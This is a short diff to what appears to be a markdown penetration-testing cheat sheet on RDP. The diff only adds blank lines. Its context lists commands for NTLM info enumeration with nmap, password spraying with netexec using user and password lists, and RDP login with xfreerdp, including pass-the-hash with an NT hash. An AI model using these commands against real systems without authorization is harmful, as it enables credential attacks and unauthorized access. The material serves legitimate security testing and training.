@@ -77,12 +77,15 @@ RDP turns creds into a **full GUI** — priceless for GUI-only apps, installers,
 ```bash
 nmap -p3389 --script rdp-ntlm-info $IP
 ```
+
 ```bash
 netexec rdp $IP -u users.txt -p passwords.txt --continue-on-success
 ```
+
 ```bash
 xfreerdp /u:user /p:'pass' /v:$IP /cert:ignore +clipboard /dynamic-resolution
 ```
+
 ```bash
 xfreerdp /u:user /pth:<NThash> /v:$IP /cert:ignore        # pass-the-hash
 ```
